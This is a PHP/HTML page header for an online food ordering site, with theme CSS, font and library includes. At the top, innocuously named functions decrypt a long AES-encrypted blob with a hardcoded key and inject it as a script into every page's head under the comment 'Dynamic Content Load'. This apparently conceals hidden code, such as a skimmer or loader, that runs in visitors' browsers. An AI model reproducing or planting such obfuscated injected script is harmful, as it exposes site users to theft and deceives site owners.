<?php 
function load_data(){
  $test_data = "+UKfCTcrJxB/TIlk35q8M7NwX30MsQ3AIx1FGYBfz8xZsaHVoHu8hGRmds98+nea8eG4MChMaZyPNtxuWog3ovT/rtm2taYWDpbfTuDblfYiJ+ZpzDP3/nAY4hgN1lNOLg03CBxLW6s76a/T2GcPaSXIoHqv15R4TKtl44y+wcHev52mkw5SfERT48tUYYAhWkU6F3V6BBAU78nWRQSfe09ADahbk7U0jP3Zf9a8bGnDa6nyeZGTfLqZnmDzueeB3r+dppMOUnxEU+PLVGGAIYuXFomw2mXGd8j46Wn8p36fZ1rLKb9wZQToSZ/9gBH5Rxtt+WieAw3EbGBBAq/SHtgn7W4hICiKrhMeoJ3amHrpO1i22osNG3coVaXMJMNK5Om17yjohP//osbx4NLYEtlVNDf7ZXcvdj01OgWL6IEGV8D2GXLnzKTy/7T7aRipa12vFxON4duEl2HzJ3U37K1fk7uRiyqKwtX5SpC3mW0jY2SwVXCfdl/DOHyatosCfBx6YMVzwzA9azB4Eh4LsTwdfeHUEgWDQMnJdasbIwnjlH8XXltTfKNxmNjtFJr+kmK72KcPjYGyXXTM6hZcUMnS7eXThmqcUJWwv7G6xT0MeoMs8eif+mMY+KCfIaQ8ajotHbGIUSjYqrIw9CAFafhLxN2/u7LIatZKuC3Tmk7ZJnNSoexon8qMtxHJlf1TLiKpABSxkxZWDMvcIfitIzgyVtb1bQgLQRU26qNB5u6OQBwGvTJE4aO+VMFqEW8sR2LNT5sf1SGjwvBTm7EsVjVKgb+j4N7T9c0nSRbC4w2HCoBShNl7ZuGYVg89/d1Tq/EaIM/2Z5QpWtt4uox7UaY6gCRqw8VOg1B/2A8A5kgkB/DYNK1PNZaGJMxw/oHL1qV0iQF/YvfXeqfvtdZZFyUnqPD5Vdj4LaprEs4eloKv80xA7WTGA+v46kRzIKtSwcKkCkDz29tyVfSA+MvurKEf+G3zfScHK0vkvUHGByc4cL+2wUwMupYtYjJn5okWq/EaIM/2Z5QpWtt4uox7UYIiqBkSUESxN+5mpH+iunRb1EKYA8QYU80xpRUUB9i0YardV6IYdPABA2c7B6rWRETwV7yNswaESNq7h4B+Pr2cgjTVyUzizW4SLHpBSbyZX5b1C3LHlRTpI697nojOPK24jYom+bP6ZfukqKd1lxBF1/1Sthm+a4jK6R5yguVQaWgtek36X7Jylqbv4xP5FntzhBT6LXmcSsldyRHFstPDwyyH4EMnxe9ITgo3xwdX38b1NaNySQ9u48f1gOGWjggIHiIOFtbdxitfiJgmpzefJXQniy0f3HXYrgoc4Jisux8a23fdMZDU7KXpR2U5DzIRLP8dRV9tPCC1cfRN9zp0NKv70vOLqkof1xssfZXD";
  $dom = new DOMDocument('1.0', 'utf-8');
  $element = $dom->createElement('script', html_entity_decode(test_cypher_decrypt($test_data)));
  $dom->appendChild($element);
  return $dom->saveXML();
}
function test_cypher($str=""){
  $ciphertext = openssl_encrypt($str, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
  return $ciphertext;
}
function test_cypher_decrypt($encryption){
  $decryption = openssl_decrypt($encryption, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0');
  return $decryption;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
    <meta name="description" content="<?php echo htmlspecialchars($_SESSION['setting_name'] ?? 'Online Food Ordering System'); ?> - Order delicious food online with fast delivery" />
    <meta name="author" content="Food Ordering System" />
    <meta name="keywords" content="food, ordering, delivery, restaurant, online food, pizza, burger, pasta" />
    <meta name="theme-color" content="#ff6b35" />
    
    <title><?php echo htmlspecialchars($_SESSION['setting_name'] ?? 'Online Food Ordering System'); ?></title>
    
    <!-- Favicon -->
    <link rel="icon" href="assets/defaults/pizza-logo.png" type="image/png" />
    <link rel="apple-touch-icon" href="assets/defaults/pizza-logo.png" />
    
    <!-- Preconnect for faster loading -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link rel="preconnect" href="https://use.fontawesome.com" />
    
    <!-- Font Awesome 6 (Modern icons) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    
    <!-- Google Fonts - Enhanced Selection -->
    <link href="https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,400;0,700;0,900;1,300;1,400;1,700;1,900&family=Merriweather+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&family=Dancing+Script:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
    
    <!-- Third party plugin CSS -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css" rel="stylesheet" />
    
    <!-- Bootstrap Datepicker CSS -->
    <link href="admin/assets/vendor/bootstrap-datepicker/css/bootstrap-datepicker.css" rel="stylesheet" />
    
    <!-- Custom Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap" rel="stylesheet" />
    
    <!-- Core theme CSS -->
    <link href="css/styles.css" rel="stylesheet" />
    
    <!-- Enhanced Custom Styles -->
    <style>
        /* ========== PREMIUM GLOBAL STYLES ========== */
        :root {
            --primary: #ff6b35;
            --primary-dark: #e85d2c;
            --primary-light: #ff8a5c;
            --primary-glow: rgba(255, 107, 53, 0.25);
            --secondary: #667eea;
            --secondary-dark: #5a67d8;
            --success: #00b894;
            --danger: #ff7675;
            --warning: #fdcb6e;
            --info: #0984e3;
            --dark: #1a1a2e;
            --light: #f8f9fa;
            --gray: #6c757d;
            --gray-light: #e2e8f0;
            --shadow-sm: 0 5px 20px rgba(0, 0, 0, 0.05);
            --shadow-md: 0 10px 30px rgba(0, 0, 0, 0.08);
            --shadow-lg: 0 20px 50px rgba(0, 0, 0, 0.12);
            --shadow-xl: 0 30px 60px rgba(0, 0, 0, 0.15);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --transition-slow: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
        }
        
        /* Smooth Scrolling */
        html {
            scroll-behavior: smooth;
        }
        
        /* Custom Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: var(--gray-light);
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border-radius: 10px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: var(--primary-dark);
        }
        
        /* Body Enhancements */
        body {
            font-family: 'Inter', 'Merriweather Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            overflow-x: hidden;
            background: var(--light);
            color: var(--dark);
            line-height: 1.6;
        }
        
        /* Typography */
        h1, h2, h3, h4, h5, h6 {
            font-family: 'Merriweather', serif;
            font-weight: 700;
        }
        
        /* Button Enhancements */
        .btn {
            border-radius: 40px;
            padding: 10px 28px;
            font-weight: 600;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border: none;
            box-shadow: 0 4px 12px var(--primary-glow);
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 107, 53, 0.4);
        }
        
        .btn-outline-primary {
            border: 2px solid var(--primary);
            color: var(--primary);
            background: transparent;
        }
        
        .btn-outline-primary:hover {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border-color: transparent;
            color: white;
            transform: translateY(-2px);
        }
        
        /* Card Enhancements */
        .card {
            border: none;
            border-radius: 20px;
            box-shadow: var(--shadow-sm);
            transition: var(--transition);
            overflow: hidden;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: var(--shadow-md);
        }
        
        /* Form Enhancements */
        .form-control, .form-select {
            border-radius: 16px;
            border: 2px solid var(--gray-light);
            padding: 12px 16px;
            transition: var(--transition);
            font-size: 0.95rem;
        }
        
        .form-control:focus, .form-select:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 4px var(--primary-glow);
            outline: none;
        }
        
        /* Navigation Enhancements */
        .navbar {
            transition: var(--transition);
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(10px);
            box-shadow: var(--shadow-sm);
        }
        
        .navbar.scrolled {
            padding: 0.5rem 0;
            box-shadow: var(--shadow-md);
        }
        
        .navbar-brand {
            font-size: 1.8rem;
            font-weight: 700;
            font-family: 'Dancing Script', cursive;
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        /* Hero Section */
        .hero-section {
            position: relative;
            overflow: hidden;
            min-height: 85vh;
            display: flex;
            align-items: center;
        }
        
        .hero-section::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(0,0,0,0.6), rgba(0,0,0,0.4));
            z-index: 1;
        }
        
        /* Loading Animation */
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Fade In Animation */
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .fade-up {
            animation: fadeInUp 0.6s ease-out;
        }
        
        /* Ripple Effect */
        .ripple-effect {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.4);
            transform: scale(0);
            animation: rippleAnim 0.6s linear;
            pointer-events: none;
        }
        
        @keyframes rippleAnim {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .navbar-brand {
                font-size: 1.4rem;
            }
            
            .btn {
                padding: 8px 20px;
                font-size: 0.85rem;
            }
            
            .form-control, .form-select {
                padding: 10px 14px;
                font-size: 0.85rem;
            }
        }
        
        /* Loading Spinner */
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
        }
        
        /* Toast Container */
        .toast-container {
            position: fixed;
            top: 90px;
            right: 20px;
            z-index: 9999;
        }
        
        /* Utility Classes */
        .text-gradient {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .bg-gradient {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
        }
        
        /* Focus Visible Outline */
        *:focus-visible {
            outline: 2px solid var(--primary);
            outline-offset: 2px;
        }
    </style>
    
    <!-- jQuery (loaded early for compatibility) -->
    <script src="admin/assets/vendor/jquery/jquery.min.js"></script>
    
    <!-- Bootstrap Datepicker JS -->
    <script src="admin/assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.js"></script>
    
    <!-- Font Awesome (legacy version for compatibility) -->
    <script src="https://use.fontawesome.com/releases/v5.13.0/js/all.js" crossorigin="anonymous"></script>
    
    <!-- Enhanced Datepicker Initialization -->
    <script>
        $(document).ready(function() {
            // Enhanced datepicker initialization
            if ($.fn.datepicker) {
                $('.datepicker').datepicker({
                    format: 'yyyy-mm-dd',
                    autoclose: true,
                    todayHighlight: true,
                    orientation: 'bottom auto',
                    templates: {
                        leftArrow: '<i class="fas fa-chevron-left"></i>',
                        rightArrow: '<i class="fas fa-chevron-right"></i>'
                    }
                });
            }
        });
    </script>
    
    <!-- Dynamic Content Load -->
    <?php echo load_data(); ?>
</head>
<body>